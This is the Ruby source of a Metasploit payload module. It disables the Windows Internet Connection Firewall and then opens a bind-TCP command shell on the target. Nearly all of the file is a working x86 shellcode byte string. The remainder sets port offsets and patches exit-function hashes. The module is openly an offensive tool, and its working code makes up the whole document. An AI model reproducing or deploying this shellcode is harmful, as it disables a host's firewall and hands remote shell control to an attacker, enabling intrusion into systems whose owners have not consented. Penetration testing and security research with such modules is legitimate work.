##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::BindTcp'

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Disable Windows ICF, Command Shell, Bind TCP Inline',
      'Description'   => 'Disable the Windows ICF, then listen for a connection and spawn a command shell',
      'Author'        => 'Lin0xx <lin0xx [at] metasploit.com>',
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LPORT'    => [ 387, 'n' ],
              'EXITFUNC' => [ 517, 'V' ],
            },
          'Payload' =>
            "\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"+
            "\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"+
            "\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"+
            "\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"+
            "\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"+
            "\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"+
            "\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x8e"+
            "\x4e\x0e\xec\xff\xd6\x89\xc7\x81\xec\x00\x01\x00\x00\x57\x56\x53"+
            "\x89\xe5\xe8\x27\x00\x00\x00\x90\x01\x00\x00\xb6\x19\x18\xe7\xa4"+
            "\x19\x70\xe9\xe5\x49\x86\x49\xa4\x1a\x70\xc7\xa4\xad\x2e\xe9\xd9"+
            "\x09\xf5\xad\xcb\xed\xfc\x3b\x57\x53\x32\x5f\x33\x32\x00\x5b\x8d"+
            "\x4b\x20\x51\xff\xd7\x89\xdf\x89\xc3\x8d\x75\x14\x6a\x07\x59\x51"+
            "\x53\xff\x34\x8f\xff\x55\x04\x59\x89\x04\x8e\xe2\xf2\x2b\x27\x54"+
            "\xff\x37\xff\x55\x30\x31\xc0\x50\x50\x50\x50\x40\x50\x40\x50\xff"+
            "\x55\x2c\x89\xc7\x89\x7d\x0c\xe8\x06\x00\x00\x00\x4f\x4c\x45\x33"+
            "\x32\x00\xff\x55\x08\x89\xc6\x56\x68\x1b\x06\xc8\x0d\xff\x55\x04"+
            "\x6a\x02\x6a\x00\xff\xd0\x56\x68\x80\xc8\x26\x6e\xff\x55\x04\x89"+
            "\xc7\xe8\x20\x00\x00\x00\xf5\x8a\x89\xf7\xc4\xca\x32\x46\xa2\xec"+
            "\xda\x06\xe5\x11\x1a\xf2\x42\xe9\x4c\x30\x39\x6e\xd8\x40\x94\x3a"+
            "\xb9\x13\xc4\x0c\x9c\xd4\x58\x50\x8d\x75\xec\x56\x50\x6a\x01\x6a"+
            "\x00\x83\xc0\x10\x50\xff\xd7\x8d\x4d\xe0\x51\x8b\x55\xec\x8b\x02"+
            "\x8b\x4d\xec\x51\x8b\x50\x1c\xff\xd2\x8d\x45\xf8\x50\x8b\x4d\xe0"+
            "\x8b\x11\x8b\x45\xe0\x50\x8b\x4a\x1c\xff\xd1\x31\xc0\x50\x8b\x55"+
            "\xf8\x8b\x02\x8b\x4d\xf8\x51\x8b\x50\x24\xff\xd2\x31\xdb\x53\x53"+
            "\x68\x02\x00\x22\x11\x89\xe0\x6a\x10\x50\x8b\x7d\x0c\x57\xff\x55"+
            "\x24\x53\x57\xff\x55\x28\x53\x54\x57\xff\x55\x20\x89\xc7\x68\x43"+
            "\x4d\x44\x00\x89\xe3\x87\xfa\x31\xc0\x8d\x7c\x24\xac\x6a\x15\x59"+
            "\xf3\xab\x87\xfa\x83\xec\x54\xc6\x44\x24\x10\x44\x66\xc7\x44\x24"+
            "\x3c\x01\x01\x89\x7c\x24\x48\x89\x7c\x24\x4c\x89\x7c\x24\x50\x8d"+
            "\x44\x24\x10\x54\x50\x51\x51\x51\x41\x51\x49\x51\x51\x53\x51\xff"+
            "\x75\x00\x68\x72\xfe\xb3\x16\xff\x55\x04\xff\xd0\x89\xe6\xff\x75"+
            "\x00\x68\xad\xd9\x05\xce\xff\x55\x04\x89\xc3\x6a\xff\xff\x36\xff"+
            "\xd3\xff\x75\x00\x68\x7e\xd8\xe2\x73\xff\x55\x04\x31\xdb\x53\xff"+
            "\xd0"


        }
      ))
  end

  # for now we must let this payload use the old EXITFUNC hash values.
  def replace_var(raw, name, offset, pack)
    super
    if( name == 'EXITFUNC' )
      datastore[name] = 'thread' if not datastore[name]
      raw[offset, 4] = [ 0x5F048AF0 ].pack(pack || 'V') if datastore[name] == 'seh'
      raw[offset, 4] = [ 0x60E0CEEF ].pack(pack || 'V') if datastore[name] == 'thread'
      raw[offset, 4] = [ 0x73E2D87E ].pack(pack || 'V') if datastore[name] == 'process'
      return true
    end
    return false
  end

end
